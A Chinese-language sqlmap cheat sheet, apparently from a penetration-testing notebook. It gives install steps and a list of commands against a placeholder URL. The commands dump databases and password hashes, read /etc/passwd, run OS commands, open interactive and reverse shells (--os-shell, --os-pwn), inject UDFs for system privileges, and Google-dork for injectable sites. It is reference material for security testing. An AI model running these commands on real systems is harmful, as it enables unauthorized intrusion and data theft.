# sqlmap

## 1.安装过程

###  1、Windows

 可以在电脑上先安装git，git for Windows的链接就在[这里](https://github.com/git-for-windows/git/releases/download/v2.31.1.windows.1/Git-2.31.1-64-bit.exe)  
确认电脑上有python环境并且已经配好了环境变量  
直接选中目录，并在cmd中打开，输入命令：

```text
git clone https://gitee.com/yixuan1/sqlmap.git
```

 下载好后，将 sqlmap.py 所在目录添加至环境变量即可

升级sqlmap时，可直接使用`git pull`命令，将电脑中的sqlmap更新至最新版本

![&#x65E0;&#x9700;&#x5347;&#x7EA7;](../../.gitbook/assets/image%20%281085%29.png)

![](../../.gitbook/assets/image%20%281086%29.png)

###  2、Linux

以ubuntu系统为例：

```text
apt update
apt install -y git python3 python3-pip
git clone https://gitee.com/yixuan1/sqlmap.git
```

 剩下的步骤类似Windows，可自行百度

## 2. 常用语句

```text
sqlmap.py -u "http://IP:PORT/?id=1" --current-user #获取当前用户名称 
sqlmap.py -u "http://IP:PORT/?id=1" --current-db #获取当前数据库名称
sqlmap.py -u "http://IP:PORT/?id=1" --tables -D "db_name" #列表名 
sqlmap.py -u "http://IP:PORT/?id=1" --columns -T "tablename" users-D "db_name" -v 0 #列字段
sqlmap.py -u "http://IP:PORT/?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0 #获取字段内容



sqlmap.py -u "http://IP:PORT/?id=1"  --smart  --level 3 --users  # smart智能 level  执行测试等级
sqlmap.py -u "http://IP:PORT/?id=1"  --dbms "Mysql" --users  # dbms 指定数据库类型
sqlmap.py -u "http://IP:PORT/?id=1"  --users  #列数据库用户
sqlmap.py -u "http://IP:PORT/?id=1"  --dbs#列数据库 
sqlmap.py -u "http://IP:PORT/?id=1"  --passwords #数据库用户密码 
sqlmap.py -u "http://IP:PORT/?id=1"  --passwords-U root  -v 0 #列出指定用户数据库密码
sqlmap.py -u "http://IP:PORT/?id=1"  --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20  #列出指定字段，列出20条 
sqlmap.py -u "http://IP:PORT/?id=1"  --dump-all -v 0 #列出所有数据库所有表
sqlmap.py -u "http://IP:PORT/?id=1"  --privileges #查看权限 
sqlmap.py -u "http://IP:PORT/?id=1"  --privileges -U root #查看指定用户权限
sqlmap.py -u "http://IP:PORT/?id=1"  --is-dba -v 1 #是否是数据库管理员
sqlmap.py -u "http://IP:PORT/?id=1"  --roles #枚举数据库用户角色 
sqlmap.py -u "http://IP:PORT/?id=1"  --udf-inject #导入用户自定义函数（获取系统权限！）
sqlmap.py -u "http://IP:PORT/?id=1"  --dump-all --exclude-sysdbs -v 0 #列出当前库所有表
sqlmap.py -u "http://IP:PORT/?id=1"  --union-cols #union 查询表记录 
sqlmap.py -u "http://IP:PORT/?id=1"  --cookie "COOKIE_VALUE" #cookie注入
sqlmap.py -u "http://IP:PORT/?id=1"  -b #获取banner信息
sqlmap.py -u "http://IP:PORT/?id=1"  --data "id=3"  #post注入
sqlmap.py -u "http://IP:PORT/?id=1"  -v 1 -f #指纹判别数据库类型 
sqlmap.py -u "http://IP:PORT/?id=1"  --proxy"http://127.0.0.1:8118" #代理注入
sqlmap.py -u "http://IP:PORT/?id=1"  --string"STRING_ON_TRUE_PAGE"  #指定关键词
sqlmap.py -u "http://IP:PORT/?id=1"  --sql-shell #执行指定sql命令
sqlmap.py -u "http://IP:PORT/?id=1"  --file /etc/passwd 
sqlmap.py -u "http://IP:PORT/?id=1"  --os-cmd=whoami #执行系统命令
sqlmap.py -u "http://IP:PORT/?id=1"  --os-shell #系统交互shell
sqlmap.py -u "http://IP:PORT/?id=1"  --os-pwn #反弹shell 
sqlmap.py -u "http://IP:PORT/?id=1"  --reg-read #读取win系统注册表
sqlmap.py -u "http://IP:PORT/?id=1"  --dbs-o "sqlmap.log" #保存进度 
sqlmap.py -u "http://IP:PORT/?id=1"  --dbs  -o "sqlmap.log" --resume  #恢复已保存进度sqlmap -g "google语法" --dump-all --batch  #google搜索注入点自动 跑出所有字段攻击实例
sqlmap.py -u "http://IP:PORT/?id=1&Submit=Submit" --cookie="PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406" --string="Surname" --dbms=mysql --users --password
```



